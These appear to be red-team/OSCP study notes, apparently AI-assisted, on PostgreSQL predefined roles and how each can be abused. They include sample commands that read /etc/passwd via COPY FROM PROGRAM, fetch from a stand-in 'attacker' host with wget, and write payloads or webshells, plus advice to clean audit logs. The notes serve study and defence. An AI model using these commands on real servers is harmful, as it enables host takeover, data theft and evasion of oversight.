Privileges

Role Explain - What's feasible (red-team / OSCP perspective)
pg_read_server_files Allows reading files that the PostgreSQL server process can access (via COPY, pg_read_file(), pg_ls_dir() 等のファイル系関数).
Red-team: read sensitive files on the host (postgres configs, logs, credential files if readable, SSH keys if mis-permissioned, /etc/passwd, application config files). Typical technique: SELECT pg_read_file('path'); or COPY (SELECT '') FROM PROGRAM 'cat /etc/passwd'; (or COPY FROM to import file contents). :contentReference[oaicite:1]{index=1}
OSCP notes: high-value for local infoleak and credential discovery. If DB runs as root (misconfigured), this becomes catastrophic. Even as 'postgres' user, you can often read config files with secrets. Mitigate by not granting this to untrusted accounts, restrict filesystem permissions, monitor use of file functions.
pg_write_server_files Allows writing files that the PostgreSQL server process can access (via COPY TO/FROM, functions that create files).
Red-team: write a webshell, drop an SSH authorized_keys entry (if permissions allow), create cron files, plant a reverse-shell launcher, or write payloads to /tmp and then attempt to execute them via other mechanisms. Example: COPY (SELECT 'payload') TO '/tmp/payload.sh'; then attempt to execute. :contentReference[oaicite:2]{index=2}
OSCP notes: combined with some execution vector (e.g., ability to run programs via other misconfigurations or via pg_execute_server_program) this enables remote command execution on the host. Monitor & deny write role to users that don't need it, and ensure DB process has minimal filesystem rights.
pg_execute_server_program
(note: often named pg_execute_server_program)		 Grants the ability to execute server-side programs as the DB process user (via COPY ... TO/FROM PROGRAM and similar features). Official doc name is pg_execute_server_program. With this you can run arbitrary programs/commands on the DB host as the postgres user. :contentReference[oaicite:3]{index=3}
Red-team: highest-risk non-superuser privilege — you can run commands (eg. COPY (SELECT 1) TO PROGRAM 'wget http://attacker/;' or pipe results to reverse shells). Typical escalation: write a binary/script (pg_write_server_files) and execute it (pg_execute_server_program) or directly use COPY TO PROGRAM to invoke commands. Many public PoCs show privilege escalation to arbitrary OS command execution from this role. :contentReference[oaicite:4]{index=4}
OSCP notes: owning this role in a lab = almost direct OS RCE (as postgres user). Treat as equivalent to full compromise for practical exploitation; clean audit logs and be cautious about leaving artifacts.
Superuser Full control of the PostgreSQL cluster and ability to perform any action, including creating roles, reading/writing any file, executing functions, altering system catalogs, and loading untrusted extensions. From red-team view, superuser access is equivalent to complete DB compromise and usually leads to host compromise (via file writes / program execution / extension loading). :contentReference[oaicite:5]{index=5}
OSCP notes: superuser = game over for target DB. If you can get a superuser role, you can create a new role with pg_execute_server_program, or directly use features to escalate to OS root in some misconfigured setups.
pg_signal_backend Allows sending signals to other server backends (cancel query or terminate session).
Red-team: can disrupt other sessions, kill replication, or cause DoS on specific queries — useful for denial-of-service or to block defenders' queries. Not directly an info-leak but helpful for disruption during exploitation.
pg_read_all_settings / pg_read_all_stats / pg_stat_scan_tables Read cluster-wide configuration and statistics (server settings, planner stats, table scan stats).
Red-team: can discover internal configuration: listen addresses, data directory, logging settings, enabled extensions, max_worker_processes, etc. This info helps pick exploitation paths (e.g., whether copy/program is allowed, file paths to target). Useful reconnaissance prior to file or code execution. :contentReference[oaicite:6]{index=6}
pg_monitor Broad read-only monitoring access (includes read_all_stats/settings).
Red-team: similar to above but packaged for monitoring; useful to fingerprint the environment and detect presence of features or misconfigurations.
pg_read_all_data / pg_write_all_data Grant broad read or write access to all tables (cluster-wide).
Red-team: pg_read_all_data lets you dump all DB contents without table-specific grants — high value for data exfiltration. pg_write_all_data lets you tamper with data globally (poisoning, creating backdoors in app data). These are serious from a data-exfil/POC perspective.
